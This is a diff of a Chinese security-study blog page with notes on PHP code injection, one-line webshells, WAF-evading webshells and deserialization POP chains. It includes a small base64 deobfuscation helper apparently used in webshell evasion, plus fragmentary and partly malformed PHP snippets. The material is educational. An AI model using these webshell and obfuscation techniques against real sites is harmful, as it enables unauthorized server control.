+<p>preg_replace()：对字符串进行正则表达式的查找，如果查找到结果，则将结果替换为正则表达式的内容。（区别preg_match()：进行正则表达式的查找）</p>
+<pre><code>preg_replace(&quot;正则表达式&quot;,&quot;字符串&quot;,&quot;若匹配成功后替换的字符串&quot;)</code></pre>
+<p>array_map函数、print_r()类似于echo，但会产生换行。</p>
+<p>call_user_func </p>
+<p>call_user_func_array</p>
+<p>ASP一句话木马</p>
+<p>wscript.exe文件</p>
+<h3 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h3><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>（1）序列化：(serialize)将对象的信息以字符串的形式保存起来。不会对类中的方法进行序列化，只会对类中的属性进行序列化。</p>
 <p>（2）反序列化：将字符串重新创建回对象。</p>
 <p>（3）当该对象需要进行反序列化操作且存在魔术方法时，反序列化会自动执行魔术方法。</p>
+<p>（4）魔术方法：在PHP序列化和反序列化中，会自动调用的某些函数。</p>
+<p>（5）如果在某个类中定义了魔术方法的使用，那么这个魔术方法不管是否被调用，在某个序列化或者反序列化的阶段将会被执行。</p>
+<p>file_get_contents($File)：读取File文件中的内容。</p>
+<p>file_put_contents($File,$Contents)：在File文件中写入Contents的内容。</p>
+<h3 id="CTF中的反序列化"><a href="#CTF中的反序列化" class="headerlink" title="CTF中的反序列化"></a>CTF中的反序列化</h3><pre><code class="php">_destrunt()&#123;
+    echo $fp1;
+&#125;
+_sleep()&#123;
+    echo $fp2
+&#125;</code></pre>
+<p>POP链：通过一个类去调用另一个类</p>
+<pre><code>function cl  ($data)&#123;
+    $step_1 = array(&#39;&#39;,&#39;&#39;);
+    $step_2 = array(&#39;thinking&#39;,&#39;JoeVatte&#39;);
+    $step_3 = str_replace($step_2,$step_1,$data);
+    $step_4 = base64_decode($step_3);
+   return $step_4;
+&#125;</code></pre>
 
       
 
@@ -353,6 +679,15 @@ echo &quot; b&quot; ^ &quot;a &quot; //空格和a异或，b和空格异或，得
   
 <nav id="article-nav">
   
+    <a href="/2021/05/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E8%BF%9B%E9%98%B6/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          文件上传漏洞的原理与实践进阶
+        
+      </div>
+    </a>
+  
   
     <a href="/2021/05/09/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">文件包含漏洞的原理与实践</div>
@@ -382,7 +717,7 @@ echo &quot; b&quot; ^ &quot;a &quot; //空格和a异或，b和空格异或，得
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">1.</span> <span class="toc-text">扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">1.1.</span> <span class="toc-text">过狗一句话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">反序列化</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">命令执行漏洞原理与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">命令执行漏洞概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">命令注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">代码注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">命令注入漏洞的测试与利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B5%8B%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">代码注入漏洞的测试与利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B1-eval%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.1.</span> <span class="toc-text">案例1 eval函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B2-assert-%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.2.</span> <span class="toc-text">案例2 assert() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B3-preg-replace-%E5%87%BD%E6%95%B0-PHP-lt-5-5"><span class="toc-number">1.5.3.</span> <span class="toc-text">案例3 preg_replace() 函数,PHP&lt;&#x3D;5.5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B4-create-function-%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.4.</span> <span class="toc-text">案例4  create_function() 函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B5%EF%BC%9A-array-map%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.5.</span> <span class="toc-text">案例5： array_map函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B6%EF%BC%9Acall-user-func%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.6.</span> <span class="toc-text">案例6：call_user_func函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">一句话木马原理及利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5-1"><span class="toc-number">2.1.</span> <span class="toc-text">代码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.1.1.</span> <span class="toc-text">PHP一句话木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ASP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.1.2.</span> <span class="toc-text">ASP一句话木马</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSP%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.1.3.</span> <span class="toc-text">JSP一句话木马</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">过狗一句话原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.1.</span> <span class="toc-text">编写思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">2.2.2.</span> <span class="toc-text">扩展</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">PHP反序列化命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%9B%AE%E7%9A%84"><span class="toc-number">3.1.</span> <span class="toc-text">序列化的目的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">序列化的基本用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.3.</span> <span class="toc-text">反序列化漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.4.</span> <span class="toc-text">反序列化漏洞的示例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95-1"><span class="toc-number">4.</span> <span class="toc-text">扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">4.1.</span> <span class="toc-text">过狗一句话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.2.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.3.</span> <span class="toc-text">CTF中的反序列化</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
